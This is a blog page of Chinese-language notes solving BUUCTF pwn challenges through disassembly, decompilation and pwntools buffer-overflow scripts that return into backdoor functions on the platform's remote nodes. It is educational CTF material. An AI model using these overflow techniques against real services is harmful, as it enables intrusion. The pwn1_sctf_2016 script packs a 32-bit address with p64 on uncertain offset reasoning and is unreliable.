---
layout: default
title: CTF Learning Challenges Notes_Pwn
categories:
- Security
tags:
- Security
---
//Description: 学习CTF中的Pwn笔记

//Create Date: 2026-05-26 16:31:25

//Author: channy

[toc]

# 刷 [BUUCTF](https://buuoj.cn/challenges)中的Pwn

## [test your nc](https://buuoj.cn/challenges#test_your_nc)
```sh
nc [ip] [port]
```
简单连接远方机器

## [rip](https://buuoj.cn/challenges#rip)
查看所有函数
```sh
objdump -t ./pwn1 | grep -E "F .text"
00000000004010a0 l     F .text	0000000000000000              deregister_tm_clones
00000000004010d0 l     F .text	0000000000000000              register_tm_clones
0000000000401110 l     F .text	0000000000000000              __do_global_dtors_aux
0000000000401140 l     F .text	0000000000000000              frame_dummy
0000000000401200 g     F .text	0000000000000001              __libc_csu_fini
0000000000401186 g     F .text	0000000000000013              fun
00000000004011a0 g     F .text	000000000000005d              __libc_csu_init
0000000000401090 g     F .text	0000000000000001              .hidden _dl_relocate_static_pie
0000000000401060 g     F .text	000000000000002b              _start
0000000000401142 g     F .text	0000000000000044              main
```
查看偏移
```sh
objdump -d ./pwn1 | grep -A 25 "main>:"
0000000000401142 <main>:
  401142:	55                   	push   %rbp
  401143:	48 89 e5             	mov    %rsp,%rbp
  401146:	48 83 ec 10          	sub    $0x10,%rsp
  40114a:	48 8d 3d b3 0e 00 00 	lea    0xeb3(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  401151:	e8 da fe ff ff       	callq  401030 <puts@plt>
  401156:	48 8d 45 f1          	lea    -0xf(%rbp),%rax
  40115a:	48 89 c7             	mov    %rax,%rdi
  40115d:	b8 00 00 00 00       	mov    $0x0,%eax
  401162:	e8 e9 fe ff ff       	callq  401050 <gets@plt>
  401167:	48 8d 45 f1          	lea    -0xf(%rbp),%rax
  40116b:	48 89 c7             	mov    %rax,%rdi
  40116e:	e8 bd fe ff ff       	callq  401030 <puts@plt>
  401173:	48 8d 3d 97 0e 00 00 	lea    0xe97(%rip),%rdi        # 402011 <_IO_stdin_used+0x11>
  40117a:	e8 b1 fe ff ff       	callq  401030 <puts@plt>
  40117f:	b8 00 00 00 00       	mov    $0x0,%eax
  401184:	c9                   	leaveq 
  401185:	c3                   	retq   

0000000000401186 <fun>:
  401186:	55                   	push   %rbp
  401187:	48 89 e5             	mov    %rsp,%rbp
  40118a:	48 8d 3d 8a 0e 00 00 	lea    0xe8a(%rip),%rdi        # 40201b <_IO_stdin_used+0x1b>
  401191:	e8 aa fe ff ff       	callq  401040 <system@plt>
  401196:	90                   	nop
  401197:	5d                   	pop    %rbp
```
其中，`sub    $0x10,%rsp`表示缓冲区大小0x10=16，`lea    -0xf(%rbp),%rax`表示从0xf=15开始读取，rbp + 8是返回地址，则偏移是15+8=23，`callq  401040 <system@plt>`表示system的地址是401040
```py
from pwn import *

#p = process('./pwn1')
p = remote('node5.buuoj.cn',26725)
offset = 23
backdoor = 0x401186
payload = b'A' * offset + p64(backdoor + 1)
p.sendline(payload)
p.interactive()
```
连上服务器
## [warmup csaw 2016](https://buuoj.cn/challenges#warmup_csaw_2016)
```sh
pwn checksec ./warmup_csaw_2016 
[*] '/home/channy/Downloads/warmup_csaw_2016'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```
以前看不起使用工具的，直到自己了解了原理后才发现，工具就是把手动分析文件分析汇编等一系列敲命令找数据这些近似重复性的工作集成到了工具上而已。使用了ghidra工具，反编译得到
```c++
void FUN_0040061d(void)

{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",FUN_0040060d);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}
void FUN_0040060d(void)

{
  system("cat flag.txt");
  return;
}
```
于是有
```py
from pwn import *
p = remote('node5.buuoj.cn',25506)
offset = 64+8
backdoor = 0x40060d
payload = b'A' * offset + p64(backdoor + 1)
p.sendline(payload)
p.interactive()
```

## [ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)
```sh
objdump -d ./ciscn_2019_n_1 | grep -A 25 "func>:"
0000000000400676 <func>:
  400676:	55                   	push   %rbp
  400677:	48 89 e5             	mov    %rsp,%rbp
  40067a:	48 83 ec 30          	sub    $0x30,%rsp
  40067e:	66 0f ef c0          	pxor   %xmm0,%xmm0
  400682:	f3 0f 11 45 fc       	movss  %xmm0,-0x4(%rbp)
  400687:	bf b4 07 40 00       	mov    $0x4007b4,%edi
  40068c:	e8 8f fe ff ff       	callq  400520 <puts@plt>
  400691:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  400695:	48 89 c7             	mov    %rax,%rdi
  400698:	b8 00 00 00 00       	mov    $0x0,%eax
  40069d:	e8 ae fe ff ff       	callq  400550 <gets@plt>
  4006a2:	f3 0f 10 45 fc       	movss  -0x4(%rbp),%xmm0
  4006a7:	0f 2e 05 46 01 00 00 	ucomiss 0x146(%rip),%xmm0        # 4007f4 <_IO_stdin_used+0x44>
  4006ae:	7a 1f                	jp     4006cf <func+0x59>
  4006b0:	f3 0f 10 45 fc       	movss  -0x4(%rbp),%xmm0
  4006b5:	0f 2e 05 38 01 00 00 	ucomiss 0x138(%rip),%xmm0        # 4007f4 <_IO_stdin_used+0x44>
  4006bc:	75 11                	jne    4006cf <func+0x59>
  4006be:	bf cc 07 40 00       	mov    $0x4007cc,%edi
  4006c3:	b8 00 00 00 00       	mov    $0x0,%eax
  4006c8:	e8 63 fe ff ff       	callq  400530 <system@plt>
  4006cd:	eb 0a                	jmp    4006d9 <func+0x63>
  4006cf:	bf d6 07 40 00       	mov    $0x4007d6,%edi
  4006d4:	e8 47 fe ff ff       	callq  400520 <puts@plt>
  4006d9:	90                   	nop
  4006da:	c9                   	leaveq 
```
`sub    $0x30,%rsp`表示缓冲区大小0x30=48，但是`movss  %xmm0,-0x4(%rbp)`即对应代码中4字节的float
```c++
void func(void)

{
  char local_38 [44];
  float local_c;
  
  local_c = 0.0;
  puts("Let\'s guess the number.");
  gets(local_38);
  if (local_c == 11.28125) {
    system("cat /flag");
  }
  else {
    puts("Its value should be 11.28125");
  }
  return;
}
```
```py
from pwn import *

p = remote('node5.buuoj.cn',29253)
offset = 44
floatnum = 11.28125
float_bytes = struct.pack('f', floatnum)
backdoor = 0x400530
payload = b'A' * offset + float_bytes
p.sendline(payload)
p.interactive()
```

## [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)
开了NX的
```sh
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
使用ghidra工具可以看到函数调用main -> vuln用fget获取长度32的输入数据，很多解题思路说fgets有漏洞，其实不是的，是后面的strcpy的漏洞，因为fgets是有限制长度的，strcpy没有长度限制的copy才有的缓冲区溢出 -> replace把I替换成you -> vuln的strcpy -> 这里溢出跳到get_flag函数。。。
```sh
080491af <vuln>:
 80491af:	55                   	push   %ebp
 80491b0:	89 e5                	mov    %esp,%ebp
 80491b2:	53                   	push   %ebx
 80491b3:	83 ec 54             	sub    $0x54,%esp
 80491b6:	c7 04 24 00 98 04 08 	movl   $0x8049800,(%esp)
 80491bd:	e8 5e fb ff ff       	call   8048d20 <printf@plt>
 80491c2:	a1 a4 b0 04 08       	mov    0x804b0a4,%eax
 80491c7:	89 44 24 08          	mov    %eax,0x8(%esp)
 80491cb:	c7 44 24 04 20 00 00 	movl   $0x20,0x4(%esp)
 80491d2:	00 
 80491d3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 80491d6:	89 04 24             	mov    %eax,(%esp)
 80491d9:	e8 92 fa ff ff       	call   8048c70 <fgets@plt>
 80491de:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 80491e1:	89 44 24 04          	mov    %eax,0x4(%esp)
 80491e5:	c7 04 24 ac b0 04 08 	movl   $0x804b0ac,(%esp)
 80491ec:	e8 df f9 ff ff       	call   8048bd0 <_ZNSsaSEPKc@plt>
```
`lea    -0x3c(%ebp),%eax`从0x3c=60开始读取？所以填充长度应该是60+4?
```py
from pwn import *

p = remote('node5.buuoj.cn',27453)
offset = 60 // 3
backdoor = 0x08048f0d
payload = b'A' * 4 + b'I' * offset + p64(backdoor + 1)
p.sendline(payload)
p.interactive()
```

## [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)
```sh
0000000000400596 <callsystem>:
  400596:	55                   	push   %rbp
  400597:	48 89 e5             	mov    %rsp,%rbp
  40059a:	bf 84 06 40 00       	mov    $0x400684,%edi
  40059f:	e8 bc fe ff ff       	callq  400460 <system@plt>
  4005a4:	5d                   	pop    %rbp
  4005a5:	c3                   	retq  

00000000004005a6 <vulnerable_function>:
  4005a6:	55                   	push   %rbp
  4005a7:	48 89 e5             	mov    %rsp,%rbp
  4005aa:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  4005ae:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  4005b2:	ba 00 02 00 00       	mov    $0x200,%edx
  4005b7:	48 89 c6             	mov    %rax,%rsi
  4005ba:	bf 00 00 00 00       	mov    $0x0,%edi
  4005bf:	e8 ac fe ff ff       	callq  400470 <read@plt>
  4005c4:	c9                   	leaveq 
  4005c5:	c3                   	retq  
```
```c++
void vulnerable_function(void)

{
  undefined1 local_88 [128];
  
  read(0,local_88,0x200);
  return;
}
```
```py
from pwn import *

p = remote('node5.buuoj.cn',28440)
offset = 128 + 8
backdoor = 0x400596
payload = b'A' * offset + p64(backdoor + 1)
p.sendline(payload)
p.interactive()
```

## [PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)
```sh
$ pwn checksec ./pwn
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```
开启了Canary的


[back](./)

